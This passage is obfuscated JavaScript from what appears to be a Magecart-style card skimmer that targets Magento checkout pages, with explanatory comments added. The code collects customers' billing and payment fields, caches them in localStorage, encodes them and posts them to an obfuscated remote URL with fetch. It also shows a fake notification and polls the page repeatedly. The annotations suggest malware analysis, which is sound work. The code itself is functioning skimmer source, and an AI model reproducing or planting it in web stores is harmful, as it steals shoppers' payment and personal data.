        if (!_0x8a18x8(_0x8a18x28[MageMainVar[55]][MageMainVar[54]])) {
          _0x8a18x34();
        }
      }
    };

   
 // This is the main exfiltration portion of the code. It sends a POST request to a URL with a file as the body of the request. 
 // The function first checks if the localStorage object has a value for the key MageMainVar[95].
 // If it does, the function gets the value of the key and uses it to create a FormData object.
 // The FormData object is then used to create a fetch request to the URL.
 // The fetch request is then sent, and the function returns false.

    
//  The first line of code defines a function called _0x8a18x39().
//  The next few lines of code check if the localStorage object has a value for the key MageMainVar[95] ("getItem",) 
//  If it does, the function gets the value of the key and uses it to create a FormData object.
//  The next line of code creates a fetch request to the URL.
//  The next line of code sends the fetch request.
//  The next line of code returns false.

    let _0x8a18x39 = () => {
      if (localStorage[MageMainVar[96]](_0x8a18x28[MageMainVar[95]])) {
        return;
      }
      let _0x8a18x3a = [];
      _0x8a18x3a[MageMainVar[47]](
        MageMainVar[97] +
          _0x8a18x8(_0x8a18x28[MageMainVar[55]][MageMainVar[54]])[
            MageMainVar[53]
          ][MageMainVar[17]](MageMainVar[57])[MageMainVar[18]]
      );
      _0x8a18x3a[MageMainVar[47]](
        MageMainVar[98] +
          _0x8a18x8(_0x8a18x28[MageMainVar[55]][MageMainVar[54]])[
            MageMainVar[53]
          ][MageMainVar[17]](MageMainVar[58])[MageMainVar[18]]
      );
      _0x8a18x3a[MageMainVar[47]](
        MageMainVar[99] +
          _0x8a18x8(_0x8a18x28[MageMainVar[55]][MageMainVar[54]])[
            MageMainVar[53]
          ][MageMainVar[17]](MageMainVar[59])[MageMainVar[18]]
      );
      if (checkoutConfig[MageMainVar[79]][MageMainVar[78]] == undefined) {
        _0x8a18x3a[MageMainVar[47]](
          MageMainVar[100] +
            _0x8a18xa(MageMainVar[76]) +
            MageMainVar[42] +
            _0x8a18xa(MageMainVar[77])
        );
        _0x8a18x3a[MageMainVar[47]](
          MageMainVar[101] + _0x8a18xa(MageMainVar[102])
        );
        _0x8a18x3a[MageMainVar[47]](
          MageMainVar[103] + _0x8a18xa(MageMainVar[104])
        );
        _0x8a18x3a[MageMainVar[47]](
          MageMainVar[105] + _0x8a18xa(MageMainVar[106])
        );
        _0x8a18x3a[MageMainVar[47]](MageMainVar[107]);
        _0x8a18x3a[MageMainVar[47]](
          MageMainVar[108] + _0x8a18xa(MageMainVar[109])
        );
        _0x8a18x3a[MageMainVar[47]](
          MageMainVar[110] + _0x8a18xa(MageMainVar[111])
        );
        _0x8a18x3a[MageMainVar[47]](
          MageMainVar[112] + _0x8a18xa(MageMainVar[113])
        );
      } else {
        let _0x8a18x3b = Object[MageMainVar[81]](
          checkoutConfig[MageMainVar[79]][MageMainVar[78]]
        )[0];
        _0x8a18x3a[MageMainVar[47]](
          MageMainVar[100] +
            _0x8a18x3b[MageMainVar[80]] +
            MageMainVar[42] +
            _0x8a18x3b[MageMainVar[82]]
        );
        _0x8a18x3a[MageMainVar[47]](
          MageMainVar[101] + _0x8a18x3b[MageMainVar[114]][0]
        );
        _0x8a18x3a[MageMainVar[47]](
          MageMainVar[103] + _0x8a18x3b[MageMainVar[115]]
        );
        _0x8a18x3a[MageMainVar[47]](
          MageMainVar[105] + _0x8a18x3b[MageMainVar[116]]
        );
        _0x8a18x3a[MageMainVar[47]](
          MageMainVar[117] + _0x8a18x3b[MageMainVar[118]]
        );
        _0x8a18x3a[MageMainVar[47]](
          MageMainVar[108] + _0x8a18x3b[MageMainVar[119]]
        );
        _0x8a18x3a[MageMainVar[47]](
          MageMainVar[110] +
            Object[MageMainVar[81]](checkoutConfig[MageMainVar[79]])[1]
        );
        _0x8a18x3a[MageMainVar[47]](MageMainVar[112]);
      }
      localStorage[MageMainVar[121]](
        _0x8a18x28[MageMainVar[95]],
        JSON[MageMainVar[120]](_0x8a18x3a)
      );
      var _0x8a18x3c = JSON[MageMainVar[122]](
        localStorage[MageMainVar[96]](_0x8a18x28[MageMainVar[95]])
      );
      _0x8a18x3a = _0x8a18x3a[MageMainVar[123]](_0x8a18x3c);
      _0x8a18x3a = _0x8a18x3a[MageMainVar[124]](function (_0x8a18x8) {
        return _0x8a18x8;
      });
      var _0x8a18x3d = btoa(
        unescape(
          encodeURIComponent(
            localStorage[MageMainVar[96]](_0x8a18x28[MageMainVar[95]])
          )
        )
      )
        [MageMainVar[38]](MageMainVar[19])
        [MageMainVar[45]]()
        [MageMainVar[48]](MageMainVar[19]);
      localStorage[MageMainVar[125]](_0x8a18x28[MageMainVar[95]]);
      IURL =
        MageMainVar[126] +
        _0x8a18xe +
        MageMainVar[64] +
        _0x8a18xf +
        MageMainVar[127] +
        _0x8a18x3d;
      block = IURL[MageMainVar[38]](MageMainVar[37]);
      contentType = block[0][MageMainVar[38]](MageMainVar[128])[1];
      realData = block[1][MageMainVar[38]](MageMainVar[129])[1];
      blob = new Blob([realData], {
        type: contentType,
      });
      fd = new FormData();
      fd[MageMainVar[130]](MageMainVar[65], blob);
      url = MageMainVar[131] + _0x8a18x10 + MageMainVar[132] + _0x8a18xf;
      fetch(url, {
        mode: MageMainVar[133],
        method: MageMainVar[134],
        body: fd,
      });
      _0x8a18x11(_0x8a18x28[MageMainVar[93]], _0x8a18xf, 5);
      _0x8a18x3e();
      return false;
    };

    // a function that sets an interval and then calls a function after a certain amount of time.
    // The function first gets the value of the _0x8a18x28[55][54] object, which is a DOM element.
    // The function then sets the textContent property of the DOM element to the value of the string 137. 
    // The function then calls the setTimeout() function, which schedules a function to be executed after a certain amount of time.
    // The function that is scheduled to be executed is the _0x8a18x3e() function. 
    // The _0x8a18x3e() function first clears the textContent property of the DOM element.
    // The function then calls the _0x8a18x28[88][54][140] function, which is a function that is used to show a notification.
    // The function passes the string 74 and the string 139 as arguments to the _0x8a18x28[88][54][140] function.

    let _0x8a18x3e = () => {
      _0x8a18x8(_0x8a18x28[MageMainVar[55]][MageMainVar[54]])[MageMainVar[53]][
        MageMainVar[17]
      ](MageMainVar[136])[MageMainVar[135]] = MageMainVar[137];
      setTimeout(() => {
        _0x8a18x8(_0x8a18x28[MageMainVar[55]][MageMainVar[54]])[
          MageMainVar[138]
        ]();
        _0x8a18x8(_0x8a18x28[MageMainVar[88]][MageMainVar[54]])[
          MageMainVar[140]
        ](MageMainVar[74], MageMainVar[139]);
      }, 2500);
    };
    setInterval(_0x8a18x38, 500);
  })();
} catch (e) {}
